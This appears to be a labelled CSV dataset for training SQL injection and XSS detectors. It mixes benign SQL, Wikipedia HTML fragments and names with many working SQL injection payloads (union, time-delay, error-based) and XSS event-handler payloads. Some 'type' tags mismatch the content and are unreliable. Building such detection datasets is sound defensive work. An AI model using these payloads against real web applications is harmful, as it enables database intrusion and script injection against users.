Text,Label,type
UPDATE `wp_options` SET `option_value`  =  '0' WHERE `option_name`  =  'medium_large_size_h',0,sql
SELECT correctly ( s FROM cow RIGHT JOIN,0,sql
34310,0,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;649–788, </li>",0,xss
"	 </span> <span class=""toctext"">In fiction ",0,xss
"<ul><li><a href=""#CITEREFHowe1994"">Howe 1994 </a> </li> </ul>",0,xss
"<div onbeforepaste=""alert(1)"" contenteditable>test</div>",2,xss
reconfortante,0,sql
<frameset><frame id=x onfocus=alert(1)>,2,xss
SELECT mostly FROM expect UNION ALL SELECT related FROM finish ORDER BY pipe,0,sql
SELECT * FROM occasionally 3,0,sql
6014,0,sql
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,xss
"  SELECT prizeID AS ID, either AS plain FROM carefully",0,sql
"	 </span> <span class=""reference-text"">",0,xss
"  SELECT grandmother,headed,element FROM bright LEFT JOIN Orders ON wear.areID =  birds.frame ORDER BY customs.musical",0,sql
" SELECT CustomerName, City FROM Customers;",0,sql
"1""  )   where 1107  =  1107 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""qcqx"" like ""qcqx",1,xss
"""a"""" or 1  =  1--""",1,sql
"<li><a href=""/wiki/Security_service_(telecommunication)"" title=""Security service (telecommunication)"">Security services </a> </li>",0,xss
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></h1>",2,xss
"	 </span> <span class=""reference-text"">",0,xss
"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;214–215 </li>",0,xss
argamasilla de calatrava,0,sql
<tbody onpointerover=alert(1)>XSS</tbody>,2,xss
SELECT * FROM course WHERE sink BETWEEN '1996-07-01' AND '1996-07-31',0,xss
" SELECT * FROM blank ORDER BY label, engine",0,sql
"<h1 onkeyup=""alert(1)"" contenteditable>test</h1>",2,xss
"1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  '",1,sql
-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  ',1,sql
"1""   )    )    and 9800  =  8713",1,sql
quintino,0,sql
"1' in boolean mode  )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
SELECT * FROM dress WHERE foreign NOT BETWEEN 'deer' AND 'away',0,sql
suchet@ciaplast.tel,0,sql
SELECT * FROM distant WHERE silent NOT LIKE 'many%',0,sql
SELECT * FROM plural  WHERE related NOT LIKE '[according]%',0,xss
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1,sql
"<plaintext ondblclick=""alert(1)"">test</plaintext>",2,xss
"<col draggable=""true"" ondragleave=""alert(1)"">test</col>",2,xss
SELECT tower ( s )  FROM sometime UNION,0,sql
"<li id=""cite_note-224""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-224"">^ </a> </b> ",0,xss
1  )   or sleep  (  __TIME__  )  #,1,xss
"  SELECT HOUR ( ""838:59:59"" ) ;",0,xss
SELECT * FROM gas WHERE NOT attention = 'hollow'  AND NOT cell = 'search',0,sql
"<div id=""mw-page-base"" class=""noprint""> </div>",0,xss
SELECT MIN ( truck )  AS me FROM west,0,sql
jellison@acch-portugal.uk,0,sql
"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""usht"" like ""usht",1,sql
</script>,0,xss
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82f1dbb24' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,sql
"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1,sql
"<li id=""cite_note-100""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-100"">^ </a> </b> ",0,xss
1'+  (  select oljg where 2006  =  2006 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1,sql
<label id=x tabindex=1 onbeforeactivate=alert(1)></label>,2,xss
3.61806E+15,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Atlantic&amp;rft.atitle=Chatbots+Have+Entered+the+Uncanny+Valley&amp;rft.date=2018&amp;rft.aulast=Waddell&amp;rft.aufirst=Kaveh&amp;rft_id=https%3A%2F%2Fwww.theatlantic.com%2Ftechnology%2Farchive%2F2017%2F04%2Funcanny-valley-digital-assistants%2F523806%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
31594,0,sql
SELECT TOP 50 PERCENT * FROM product SELECT * FROM lack FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM circus,0,sql
"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'niro'  =  'niro",1,xss
SELECT AVG ( chose ) FROM buy SELECT SUM ( beside ) ,0,sql
-5134   )    )     )   or 8571  =  8571--,1,xss
68318279e,0,sql
"<td oncut=""alert(1)"" contenteditable>test</td>",2,xss
SELECT * FROM someone FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"INSERT INTO bee  ( related, return, either )  VALUES  ( 'wear', 'matter', 'blue' )  ",0,sql
"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",1,xss
"  SELECT * FROM given WHERE good IN  ( 'halfway', 'enemy', 'driven' )  ",0,sql
vilca llora,0,sql
5154,0,xss
"1'   )    )    union all select null,null,null,null,null,null#",1,xss
abagail,0,sql
35is117r,0,sql
"<ins onpaste=""alert(1)"" contenteditable>test</ins>",2,xss
 UPDATE suit SET nearer = 'share'WHERE decide = 'forth',0,sql
1'+  (  select 'rqok' where 5074  =  5074 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',1,xss
1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',1,sql
"<tbody onbeforecut=""alert(1)"" contenteditable>test</tbody>",2,xss
<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>,2,xss
SELECT * FROM useful WHERE immediately = 'series'  AND City = 'problem',0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT * FROM parent WHERE NOT could = 'nation'  AND NOT prevent = 'thank',0,sql
"<script onmouseup=""alert(1)"">test</script>",2,xss
<script id=x tabindex=1 onfocus=alert(1)></script>,2,xss
"<dt><a class=""reference internal"" href=""topics/asyncio.html""><span class=""doc"">asyncio",0,xss
cuerva,0,sql
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow",1,sql
SELECT hospital FROM why,0,sql
-1769 union all select 6054--,1,sql
"1""  )   as nixg where 4580  =  4580 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,sql
"<li><a href=""/wiki/Pseudoscience"" title=""Pseudoscience"">Pseudoscience </a> </li>",0,xss
listeza,0,sql
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,sql
"1""  )   where 9020  =  9020 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,sql
SELECT * FROM  ( SELECT development FROM traffic ) ,0,xss
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" ontransitionend=alert(1)></summary>",2,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Computer_art"" title=""Computer art"">Computer art </a> </div>",0,xss
"<figure ondblclick=""alert(1)"">test</figure>",2,xss
"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"olivar, 174,",0,sql
"1,  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",1,sql
1 and sleep  (  5  )  -- ruuv,1,sql
"	<h3 id=""p-namespaces-label"">Namespaces </h3>",0,xss
"<marquee oncopy=""alert(1)"" contenteditable>test</marquee>",2,xss
SELECT CEILING ( 25.75 ) ;,0,sql
SELECT in ( s )  FROM missing SELECT deer FROM written,0,sql
	 </span> ,0,xss
"<style>:target {color:red;}</style><form id=x style=""transition:color 1s"" ontransitionend=alert(1)></form>",2,xss
"<li id=""cite_note-336""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-336"">^ </a> </b> ",0,xss
"  <link rel=""stylesheet"" href=""_static/css/tooltipster-sideTip-shadow.min.css"" type=""text/css"" />",0,xss
"<fieldset onkeypress=""alert(1)"" contenteditable>test</fieldset>",2,xss
5.37737E+15,0,xss
SELECT * FROM eventually WHERE evidence LIKE '%highway%',0,sql
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""> <?import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" to=""<SCRIPT DEFER>alert("""")</SCRIPT>"">",2,xss
kai-larsen-picchio6@multasdetransito.net,0,sql
"1%""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,sql
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",1,sql
SELECT stepped FROM necessary UNION ALL SELECT suppose FROM start ORDER BY lead,0,sql
SELECT * FROM shirt  WHERE occasionally NOT LIKE '[clothing]%',0,xss
"-7313""  )   where 3606  =  3606 union all select 3606#",1,sql
SELECT AVG ( knife ) FROM characteristic,0,sql
"  SELECT Orders.richrID, Employees.breeze, Employees.slipped FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.spellID ORDER BY Orders.planeID",0,sql
mertin lombana,0,sql
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""nubc"" like ""nubc",1,sql
1'+  (  select 'lcru' where 3215  =  3215,1,sql
mud6787t6,0,sql
"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>",2,xss
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,xss
pu128,0,sql
SELECT COUNT ( news ) FROM lamp,0,sql
"   SELECT measure, they+ ', ' + declared+ ' ' + repeat+ ', ' + entire AS catch  FROM hospital",0,sql
geffner-schoo@bacoespecialseleccin.bm,0,sql
"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
SELECT DISTINCT father FROM yard,0,sql
SELECT * FROM wp_posts WHERE ID  =  28080 LIMIT 1,0,sql
moriego,0,xss
"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",1,xss
6922,0,sql
SELECT * FROM using 3,0,xss
"  SELECT twentyID AS ID, me AS excited FROM wife",0,sql
lladorre,0,xss
bears,0,sql
SELECT species ( s )  FROM heart UNION ALL,0,sql
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc",1,sql
SELECT * FROM dozen  WHERE screen NOT LIKE '[combination]%',0,sql
"1"" where 9919  =  9919",1,sql
"1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",1,xss
SELECT TOP 3 * FROM material,0,sql
"  SELECT trunk,bare,speak FROM mirror LEFT JOIN Orders ON leader.streamID =  species.hearing ORDER BY feel.anything",0,sql
SELECT * FROM officer WHERE standard BETWEEN early09/01/1996influence AND relationship15/31/1996duty,0,sql
"1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#",1,sql
"  SELECT Orders.anybodyrID, Employees.start, Employees.fill FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.shirtID ORDER BY Orders.jetID",0,sql
"	 </span></code></a> and <a class=""reference external"" href=""https://docs.python.org/3/library/asyncio.html#module-asyncio"" title=""(in Python v3.8)""><code class=""xref py py-mod docutils literal notranslate""><span class=""pre"">asyncio",0,xss
roquemore@veocime.bu,0,sql
chilln,0,xss
"camio da mina, 175,",0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">Artificial general intelligence </a> and <a href=""/wiki/AI-complete"" title=""AI-complete"">AI-complete </a> </div>",0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
-7404' where 1536  =  1536 order by 1#,1,sql
40542,0,xss
	 </span>,0,xss
" SELECT * FROM species ORDER BY steel, drop",0,sql
<slot onpointerleave=alert(1)>XSS</slot>,2,xss
select pg_sleep  (  5  )   and 'rpka'  =  'rpka,1,sql
melque de cercos,0,sql
SELECT MIN ( mile )  AS class FROM careful,0,sql
"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
-5137  )   or 9323  =  9323#,1,sql
"-8929%'  )   union all select 9486,9486,9486,9486#",1,sql
<progress onpointermove=alert(1)>XSS</progress>,2,xss
" SELECT column_name ( s )  FROM fox,done",0,xss
"<li><a href=""/wiki/Gary_Marcus"" title=""Gary Marcus"">Marcus, Gary </a>, ""Am I Human?: Researchers need new ways to distinguish artificial intelligence from the natural kind"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 316, no. 3 (March 2017), pp.&#160;58–63.  A stumbling block to AI has been an incapacity for reliable <a href=""/wiki/Disambiguation"" class=""mw-redirect"" title=""Disambiguation"">disambiguation </a>.  An example is the ""pronoun disambiguation problem"":  a machine has no way of determining to whom or what a <a href=""/wiki/Pronoun"" title=""Pronoun"">pronoun </a> in a sentence refers. (p.&#160;61.) </li>",0,xss
SELECT * FROM floating WHERE occasionally = 'built' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM difficult ORDER BY neighbor,0,xss
emil,0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFDomingos2015"">Domingos 2015 </a>, p.&#160;187. ",0,xss
"1""  )   waitfor delay '0:0:5' and   (  ""vjpg""  =  ""vjpg",1,sql
SELECT AVG ( source ) FROM failed SELECT SUM ( sky ) ,0,sql
"<style>:target {transform: rotate(180deg);}</style><body id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></body>",2,xss
"-1526'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xpob'  =  'xpob",1,sql
"<source draggable=""true"" ondragleave=""alert(1)"">test</source>",2,xss
<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>,2,xss
<base id=x tabindex=1 onbeforeactivate=alert(1)></base>,2,xss
"<video draggable=""true"" ondragstart=""alert(1)"">test</video>",2,xss
 UPDATE addition SET consider = 'pack'WHERE cover = 'use',0,sql
-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,1,sql
1467,0,sql
SELECT * FROM clear  WHERE continued = how,0,xss
"1"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT * FROM port FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM forgotten,0,sql
"  SELECT * FROM tail WHERE wet IN  ( 'court', 'birth', 'image' )  ",0,sql
d9str7par,0,sql
"<progress draggable=""true"" ondragleave=""alert(1)"">test</progress>",2,xss
-4900'   )    )    or 7208  =  3236,1,sql
song@eyewear.nom.aw,0,sql
SELECT * FROM birthday WHERE continued = 'slowly' FETCH FIRST 3 ROWS ONLY,0,sql
      <hr/>,0,xss
SELECT * FROM noun WHERE NOT rod = 'younger'  AND NOT for = 'balance',0,sql
souther,0,sql
"  SELECT ROUND ( 135.375, 2 ) ;",0,sql
<font onpointerup=alert(1)>XSS</font>,2,xss
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,1,sql
"<li><img alt=""Outline"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/10px-Global_thinking.svg.png"" decoding=""async"" title=""Outline"" width=""10"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/15px-Global_thinking.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/4/41/Global_thinking.svg/21px-Global_thinking.svg.png 2x"" data-file-width=""130"" data-file-height=""200"" /> <b><a href=""/wiki/Outline_of_robotics"" title=""Outline of robotics"">Outline </a> </b> </li> </ul>",0,xss
-2100' where 9260  =  9260 or 3038  =  3038,1,xss
"1"" where 6023  =  6023",1,sql
"1""  )   as kndn where 9314  =  9314",1,sql
SELECT interest ( s )  FROM still,0,sql
	 </span>,0,xss
SELECT MIN ( walk )  AS exactly FROM substance,0,sql
83677248m,0,xss
"<rt oncopy=""alert(1)"" contenteditable>test</rt>",2,xss
"<textarea draggable=""true"" ondragenter=""alert(1)"">test</textarea>",2,xss
"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",1,sql
"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
-4557 or 6872  =  6872-- kkte,1,sql
<aside id=x tabindex=1 onfocus=alert(1)></aside>,2,xss
SELECT picture FROM vowel UNION SELECT plus FROM necessary ORDER BY coming,0,sql
perpi izurrieta,0,sql
"<h3><span class=""mw-headline"" id=""Hospitality"">Hospitality ",0,xss
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   '%'  =  '",1,sql
"<ul><li><a href=""/wiki/Remotely_operated_underwater_vehicle"" title=""Remotely operated underwater vehicle"">remotely-operated </a> </li> </ul> </li> </ul>",0,xss
3407,0,sql
"<li class=""toclevel-2 tocsection-34""><a href=""#Evaluating_progress""><span class=""tocnumber"">6.6 ",0,xss
<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>,2,xss
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # cykf,1,sql
"<dd onkeyup=""alert(1)"" contenteditable>test</dd>",2,xss
6.02828E+15,0,sql
"<u draggable=""true"" ondragleave=""alert(1)"">test</u>",2,xss
eulalio,0,sql
"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1,sql
"1  )   as rbmn where 5948  =  5948 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,1,sql
77714009e,0,sql
SELECT * FROM can ORDER BY most DESC,0,xss
"<iframe oncopy=""alert(1)"" contenteditable>test</iframe>",2,xss
"SELECT * FROM real WHERE evidence BETWEEN ""complex"" AND    ""whether""",0,sql
"<image onclick=""alert(1)"">test</image>",2,xss
"1%'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"   SELECT spin, truth, cotton FROM struggle WHERE whether  IS NULL",0,xss
SELECT TOP 50 PERCENT * FROM cook SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0,sql
 </p>,0,xss
4562,0,sql
65904927z,0,sql
SELECT determine ( s ) FROM excitement INNER JOIN,0,xss
"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",1,sql
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dfxd' like 'dfxd",1,sql
"-9014%'  )   union all select 4211,4211,4211,4211,4211,4211#",1,sql
8clo736,0,xss
"1  )   as wuio where 5312  =  5312 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"1'   )    )    as efmy where 7299  =  7299 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,1,sql
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,sql
SELECT friend ( s FROM month RIGHT JOIN,0,xss
1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>,2,xss
"-3979' in boolean mode  )   union all select 4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",1,xss
"	 </span> <span class=""reference-text""><a href=""/wiki/Sepp_Hochreiter"" title=""Sepp Hochreiter"">Sepp Hochreiter </a> (1991), <a rel=""nofollow"" class=""external text"" href=""http://people.idsia.ch/~juergen/SeppHochreiter1991ThesisAdvisorSchmidhuber.pdf"">Untersuchungen zu dynamischen neuronalen Netzen </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20150306075401/http://people.idsia.ch/~juergen/SeppHochreiter1991ThesisAdvisorSchmidhuber.pdf"">Archived </a> 6 March 2015 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a>, Diploma thesis. Institut f. Informatik, Technische Univ. Munich. Advisor: J. Schmidhuber. ",0,xss
pereda barrio,0,xss
"   SELECT tomorrow, speak, plastic FROM particular WHERE upper  IS NULL",0,xss
SELECT MIN ( importance )  AS health FROM log,0,sql
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'xkxi' like 'xkxi",1,xss
SELECT TOP 50 PERCENT * FROM one,0,sql
SELECT COUNT ( herself )  FROM bush,0,sql
SELECT pool FROM particles,0,xss
SELECT * FROM said WHERE slowly = 'lose',0,sql
"calle gola de perellonet, 196,",0,sql
"<IMG SRC=`javascript:alert(""RSnake says, ''"")`>",2,xss
522lta,0,xss
gabriela1,0,xss
DELETE FROM mud,0,sql
"-1999  )   union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",1,sql
SELECT CEIL ( 25.75 ) ;,0,sql
10161,0,sql
"<li><a href=""/wiki/Enterprise_software"" title=""Enterprise software"">Enterprise software </a> </li>",0,xss
"<shadow draggable=""true"" ondragenter=""alert(1)"">test</shadow>",2,xss
"  SELECT lengthID AS ID, girl AS fastened FROM imagine",0,sql
"<u draggable=""true"" ondragstart=""alert(1)"">test</u>",2,xss
oa,0,sql
SELECT * FROM protection WHERE    NOT everybody = 'able',0,sql
"-4280%""   )    )     )   union all select 7981,7981--",1,sql
<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>,2,xss
"calle santa teresa, 87 5?b",0,sql
"<command onbeforecut=""alert(1)"" contenteditable>test</command>",2,xss
"<content draggable=""true"" ondragleave=""alert(1)"">test</content>",2,xss
" SELECT * FROM section ORDER BY wing, himself",0,xss
SELECT eventually ( s )  FROM double SELECT property FROM wish,0,xss
"   SELECT rhythm, nearly, certain FROM shape WHERE world  IS NULL",0,xss
25254382z,0,xss
" SELECT * FROM zulu ORDER BY height ASC, remove DESC",0,sql
SELECT * FROM necessary WHERE money = 'wash'  AND  ( slow = 'office' OR shadow = 'glass' ) ,0,sql
"<li><a href=""/wiki/Unmanned_ground_vehicle"" title=""Unmanned ground vehicle"">ground </a> </li> </ul> </li>",0,xss
"<bgsound draggable=""true"" ondrag=""alert(1)"">test</bgsound>",2,xss
fabrs xamena,0,sql
<input4 onpointerout=alert(1)>XSS</input4>,2,xss
lengua barrios,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"<input onmouseleave=""alert(1)"">test</input>",2,xss
" select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",1,sql
SELECT * FROM to FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1'||  (  select 'zrea' from dual where 1223  =  1223 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
saturnino,0,sql
SELECT thank,0,sql
"<li><a href=""/wiki/Geography_of_robotics"" title=""Geography of robotics"">Geography </a> </li>",0,xss
 ,0,xss
<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>,2,xss
armelle,0,xss
cristaldo marchan,0,sql
"1'  )   where 3450  =  3450 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
63829565b,0,sql
